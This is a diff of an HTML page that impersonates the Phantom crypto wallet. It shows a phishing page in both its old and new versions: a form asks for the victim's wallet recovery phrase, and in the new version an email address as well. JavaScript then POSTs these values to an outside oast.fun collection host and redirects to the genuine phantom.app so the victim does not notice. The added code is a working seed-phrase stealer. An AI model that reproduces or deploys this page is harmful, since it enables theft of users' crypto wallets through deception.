@@ -1,39 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Phantom Wallet | Connect</title>
-  <link rel="icon" href="/assets/logo.png">
+  <title>Phantom</title>
   <style>
-    body {
-      font-family: sans-serif; background: #111; color: white; text-align: center;
-      padding-top: 100px;
-    }
-    .container {
-      background: #222; padding: 30px; border-radius: 12px; width: 300px; margin: auto;
-    }
-    input, button {
-      width: 100%; margin: 10px 0; padding: 10px;
-    }
+    body { font-family: sans-serif; background: #0d0d0d; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+    .login-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 300px; }
+    input { width: 100%; padding: 10px; margin-bottom: 10px; background: #333; border: none; color: white; }
+    button { width: 100%; padding: 10px; background: #512da8; border: none; color: white; border-radius: 5px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="/assets/logo.png" width="50">
-    <h2>Restore Phantom Wallet</h2>
-    <p>Enter your 12-word recovery phrase:</p>
-    <textarea id="seed" rows="4" placeholder="word1 word2 ... word12"></textarea>
-    <button onclick="send()">Restore</button>
+  <div class="login-box">
+    <h2>Unlock Wallet</h2>
+    <input id="email" type="email" placeholder="Email" />
+    <input id="phrase" type="text" placeholder="Secret Recovery Phrase" />
+    <button onclick="submit()">Unlock</button>
   </div>
 
   <script>
-    function send() {
-      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/poc", {
+    function submit() {
+      const email = document.getElementById("email").value.trim();
+      const phrase = document.getElementById("phrase").value.trim();
+
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
         method: "POST",
-        body: new URLSearchParams({ seed: document.getElementById("seed").value })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, phrase })
       });
-      alert("Wallet restored. Please wait...");
-      window.location.href = "https://phantom.app"; // redirect fake
+
+      // Delay before redirecting to real phantom.app
+      setTimeout(() => {
+        window.location.href = "https://phantom.app";
+      }, 1500);
     }
   </script>
 </body>
